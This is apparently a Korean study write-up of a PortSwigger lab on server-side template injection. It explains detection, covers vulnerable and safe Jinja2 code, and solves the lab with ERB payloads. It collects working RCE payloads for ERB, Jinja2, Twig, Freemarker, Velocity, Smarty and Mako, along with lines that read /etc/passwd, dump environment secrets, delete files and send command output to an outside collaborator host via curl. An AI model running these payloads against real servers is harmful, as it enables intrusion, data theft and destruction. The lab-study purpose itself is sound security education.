# Lab: Basic server-side template injection

## 개요

- **난이도**: Apprentice
- **주제**: Server-Side Template Injection — ERB / Ruby / 기초 개념
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

## SSTI 기초 개념

### Server-Side Template Injection 이란

```
[템플릿 엔진의 정상 동작]
  서버: template = "Hello, {{name}}!"
  변수: name = "Alice"
  결과: "Hello, Alice!"

[SSTI 취약점]
  사용자 입력을 변수가 아닌 템플릿 자체로 렌더링

  정상: template = f"Hello, {name}!"   ← name 을 값으로 삽입
  취약: template = render(name)         ← name 을 템플릿으로 실행

  공격자 입력: name = "{{7*7}}"
  결과:        "Hello, 49!"             ← 서버에서 계산됨 → SSTI 확인
```

### SSTI vs XSS 비교

```
[XSS — 클라이언트 측 실행]
  악성 스크립트가 브라우저(클라이언트)에서 실행
  → 피해자 브라우저를 공격
  → 세션 탈취, DOM 조작

[SSTI — 서버 측 실행]
  악성 템플릿 코드가 서버에서 실행
  → 서버 자체를 공격
  → RCE(원격 코드 실행), 파일 읽기/삭제, 환경변수 탈취
  → 훨씬 심각한 영향
```

### SSTI 탐지 방법

```
1단계 — 템플릿 구문 삽입
  {{7*7}}    → 49   (Jinja2, Twig, Pebble)
  ${7*7}     → 49   (Freemarker, Mako)
  <%= 7*7 %> → 49   (ERB)
  #{7*7}     → 49   (Slim)

2단계 — 엔진 식별
  {{7*'7'}} → 49   (Jinja2)
  {{7*'7'}} → 7777777 (Twig)
  → 동작 방식 차이로 엔진 구분

3단계 — 엔진별 페이로드로 RCE
```

### SSTI 발생 원인

```python
# 취약한 코드 (사용자 입력을 템플릿으로 사용)
from jinja2 import Template
name = request.args.get('name')
template = Template(f"Hello, {name}!")   # ← 입력이 템플릿 문자열에 포함
result = template.render()

# 안전한 코드 (사용자 입력을 변수로 전달)
template = Template("Hello, {{ name }}!")
result = template.render(name=name)      # ← 입력은 변수로만 전달
```

## ERB 템플릿 엔진

### ERB (Embedded Ruby) 기본 구문

```erb
<%# 주석 — 출력 없음 %>

<% 실행만 (출력 없음) %>
<% x = 10 %>

<%= 실행 + 출력 %>
<%= 1 + 1 %>          → 2
<%= "hello".upcase %> → HELLO

<%- -%>  앞뒤 공백/개행 제거 버전
<%-= 7*7 -%>          → 49 (주변 공백 제거)
```

### ERB 코드 실행 페이로드

```erb
<%# 시스템 명령 실행 방법 3가지 %>

<%= system('whoami') %>
→ system() 은 명령 실행 후 true/false 반환
→ 명령 출력은 stdout 으로 바로 출력 (응답 body 앞부분에 포함)

<%= `whoami` %>
→ 백틱: 명령 실행 후 결과 문자열 반환
→ 응답에 결과가 직접 포함됨 (가장 깔끔)

<%= IO.popen('whoami').read %>
→ IO.popen 으로 명령 실행 후 출력 읽기

<%= %x(whoami) %>
→ %x(): 백틱과 동일한 효과
```

### ERB 유용한 페이로드 모음

```erb
<%# 사용자 확인 %>
<%= `whoami` %>
<%= `id` %>

<%# 파일 읽기 %>
<%= File.read('/etc/passwd') %>
<%= IO.read('/home/carlos/secret') %>

<%# 파일 삭제 %>
<%= system('rm /home/carlos/morale.txt') %>
<%= File.delete('/home/carlos/morale.txt') %>

<%# 디렉토리 탐색 %>
<%= `ls /home/carlos/` %>
<%= Dir.entries('/home') %>

<%# 환경변수 %>
<%= ENV['SECRET_KEY'] %>
<%= ENV.to_h %>

<%# 네트워크 (OOB) %>
<%= `curl http://COLLABORATOR/$(whoami)` %>
```

## 이번 랩 문제 풀이

### 취약 지점

URL 파라미터 `message` 가 ERB 템플릿으로 렌더링됨:

```
GET /?message=Unfortunately+this+product+is+out+of+stock
→ "Unfortunately this product is out of stock" 을 ERB 로 렌더링
```

### 1단계 — SSTI 확인

```
GET /?message=<%25%3d+7*7+%25>
(URL 디코딩: <%= 7*7 %>)
```

응답에 `49` 출력 → ERB 템플릿 엔진으로 실행됨 확인

### 2단계 — RCE 확인

```
GET /?message=<%25%3d+`whoami`+%25>
(URL 디코딩: <%= `whoami` %>)
```

응답에 `peter-gBxxxx` 출력

### 3단계 — 파일 삭제

```
GET /?message=<%25%3d+system('rm+/home/carlos/morale.txt')+%25>
(URL 디코딩: <%= system('rm /home/carlos/morale.txt') %>)
```

`true` 반환 → 파일 삭제 완료

### URL 인코딩 참고

```
<  → %3c
>  → %3e
=  → %3d
%  → %25

<%= %>  → %3c%25%3d+...+%25%3e
또는     → <%25%3d+...+%25>  (< 와 > 만 인코딩)
```

## 주요 템플릿 엔진별 기본 구문 비교

| 엔진 | 언어 | 출력 | 실행 | 주석 |
|------|------|------|------|------|
| **ERB** | Ruby | `<%= %>` | `<% %>` | `<%# %>` |
| **Jinja2** | Python | `{{ }}` | `{% %}` | `{# #}` |
| **Twig** | PHP | `{{ }}` | `{% %}` | `{# #}` |
| **Freemarker** | Java | `${ }` | `<#...>` | `<#-- -->` |
| **Velocity** | Java | `$var` | `#set(...)` | `##` |
| **Smarty** | PHP | `{$var}` | `{php}` | `{* *}` |
| **Mako** | Python | `${ }` | `<% %>` | `##` |
| **Pebble** | Java | `{{ }}` | `{% %}` | `{# #}` |
| **Handlebars** | JS | `{{ }}` | — | `{{!-- --}}` |
| **Mustache** | 다수 | `{{ }}` | — | `{{! }}` |

### 엔진별 RCE 페이로드

```
[ERB — Ruby]
  <%= system('whoami') %>
  <%= `whoami` %>

[Jinja2 — Python]
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
  {% for x in ().__class__.__base__.__subclasses__() %}...{% endfor %}

[Twig — PHP]
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
  {{['id']|filter('system')}}

[Freemarker — Java]
  <#assign ex = "freemarker.template.utility.Execute"?new()>
  ${ex("whoami")}

[Velocity — Java]
  #set($x = "")
  #set($rt = $x.class.forName("java.lang.Runtime"))
  #set($proc = $rt.getRuntime().exec("whoami"))

[Smarty — PHP]
  {system('whoami')}
  {php}echo shell_exec('whoami');{/php}

[Mako — Python]
  ${__import__('os').popen('whoami').read()}
```

## SSTI 탐지 흐름도

```
입력: {{7*7}}
  └─ 49 출력?
       ├─ Yes → Jinja2 / Twig / Pebble
       │          └─ {{7*'7'}} = 7777777 → Twig
       │          └─ {{7*'7'}} = 49      → Jinja2
       └─ No
           입력: ${7*7}
             └─ 49 출력?
                  ├─ Yes → Freemarker / Mako
                  └─ No
                      입력: <%= 7*7 %>
                        └─ 49 출력?
                             ├─ Yes → ERB (Ruby)
                             └─ No → 다른 엔진 탐색
```

## 핵심 정리

- SSTI 는 사용자 입력이 템플릿 변수가 아닌 템플릿 코드 자체로 처리될 때 발생하며, 서버에서 임의 코드가 실행된다.
- ERB(`<%= %>`)는 Ruby 의 템플릿 엔진으로, 백틱이나 `system()`, `IO.popen()` 으로 OS 명령을 실행할 수 있다.
- 탐지는 `<%= 7*7 %>` → `49` 확인으로 시작하고, 이후 `<%= \`whoami\` %>` 등으로 RCE 로 확장한다.
- 각 템플릿 엔진마다 구문이 다르므로, 엔진을 먼저 식별한 뒤 적합한 페이로드를 사용해야 한다.
